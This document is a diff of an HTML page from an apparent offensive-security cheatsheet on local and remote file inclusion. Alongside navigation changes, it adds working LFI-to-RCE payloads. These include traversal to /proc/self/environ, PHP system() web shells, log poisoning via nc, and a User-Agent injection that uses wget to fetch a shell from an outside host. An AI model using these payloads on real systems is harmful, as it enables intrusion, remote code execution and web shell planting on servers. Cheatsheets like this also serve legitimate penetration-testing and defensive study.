@@ -5,7 +5,7 @@
     
       <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
-<meta name="revised" content="2019-06-30T22:21:03 CEST">
+<meta name="revised" content="2019-07-02T10:57:17 CEST">
 <title>Local and Remote File Inclusions :: Offensive Security Cheatsheet</title>
 <link rel="shortcut icon" href="/images/favicon.png" type="image/x-icon" />
 <link href="/css/font-awesome.min.css" rel="stylesheet">
@@ -276,6 +276,13 @@
         <div>
           <a href="/open-source-intelligence-osint/human-recon/social-networks/tinder/">
             Tinder
+          </a><i class="fa fa-circle-thin read-icon"></i>
+        </div>
+    </li>
+      <li data-nav-id="/open-source-intelligence-osint/human-recon/social-networks/usernames_mails/" class="dd-item">
+        <div>
+          <a href="/open-source-intelligence-osint/human-recon/social-networks/usernames_mails/">
+            Usernames and Emails
           </a><i class="fa fa-circle-thin read-icon"></i>
         </div>
     </li>
@@ -754,6 +761,20 @@
         <div>
           <a href="/web-attacks/misc_others/">
             MISC &amp; Others
+          </a><i class="fa fa-circle-thin read-icon"></i>
+        </div>
+    </li>
+      <li data-nav-id="/web-attacks/burpsuite/" class="dd-item">
+        <div>
+          <a href="/web-attacks/burpsuite/">
+            BurpSuite
+          </a><i class="fa fa-circle-thin read-icon"></i>
+        </div>
+    </li>
+      <li data-nav-id="/web-attacks/postman/" class="dd-item">
+        <div>
+          <a href="/web-attacks/postman/">
+            Postman
           </a><i class="fa fa-circle-thin read-icon"></i>
         </div>
     </li>
@@ -1244,6 +1265,8 @@
    Content Management Systems (CMS)</option>
       <option value="/web-attacks/headers_injections/" >- Headers Injections</option>
       <option value="/web-attacks/misc_others/" >- MISC &amp; Others</option>
+      <option value="/web-attacks/burpsuite/" >- BurpSuite</option>
+      <option value="/web-attacks/postman/" >- Postman</option>
   
     <option value="/network/" >
    Network</option>
@@ -1304,10 +1327,7 @@ file:///etc/passwd%00
 file:///etc/passwd%2500 
 
 <span style="color:#75715e"># LFI in HTTP headers</span>
-curl --header <span style="color:#d88200">&#34;Accept-Language: php://filter/read=convert.base64-encode/resource=config.php&#34;</span>  http://target 
-
-
-<span style="color:#75715e"># LFI to RCE</span>
+curl --header <span style="color:#d88200">&#34;Accept-Language: php://filter/read=convert.base64-encode/resource=config.php&#34;</span>  http://target </code></pre></div><div class="highlight"><pre style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># LFI to RCE</span>
 Can you <span style="color:#111">read</span> <span style="color:#00a8c8">for</span> a .log file such as:
 C:<span style="color:#8045ff">\x</span>ampp<span style="color:#8045ff">\a</span>pache<span style="color:#8045ff">\l</span>ogs<span style="color:#8045ff">\a</span>ccess.log ?
 
@@ -1315,7 +1335,16 @@ Then go nc -nv IP <span style="color:#ae81ff">80</span>
 Then write:
 &lt;?php system<span style="color:#f92672">(</span><span style="color:#111">$_GET</span><span style="color:#f92672">[</span><span style="color:#d88200">&#39;acknak&#39;</span><span style="color:#f92672">])</span><span style="color:#111">;</span>?&gt;
 
-Now access the log file using the LFI and inject system <span style="color:#111">command</span> in acknak parameter !</code></pre></div>
+Now access the log file using the LFI and inject system <span style="color:#111">command</span> in acknak parameter !</code></pre></div><div class="highlight"><pre style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># Checking if proc/self/environ is accessible</span>
+<span style="color:#75715e"># If blank page --&gt; NOPE</span>
+view.php?page<span style="color:#f92672">=</span>../../../../../proc/self/environ
+
+<span style="color:#75715e"># RCE through User-Agent</span>
+<span style="color:#75715e"># Tamper data to /proc/self/environ</span>
+<span style="color:#75715e"># You can try exec() too</span>
+&lt;?system<span style="color:#f92672">(</span><span style="color:#d88200">&#39;wget http://hack-bay.com/Shells/gny.txt -O shell.php&#39;</span><span style="color:#f92672">)</span><span style="color:#111">;</span>?&gt;
+&lt;?system<span style="color:#f92672">(</span><span style="color:#111">$_GET</span><span style="color:#f92672">[</span><span style="color:#d88200">&#39;cmd&#39;</span><span style="color:#f92672">])</span><span style="color:#111">;</span>?&gt;
+view.php?page<span style="color:#f92672">=</span>../../../../../proc/self/environ?cmd<span style="color:#f92672">=</span>ls</code></pre></div>
 <p><br/></p>
 
 <h3 id="wrappers">Wrappers</h3>
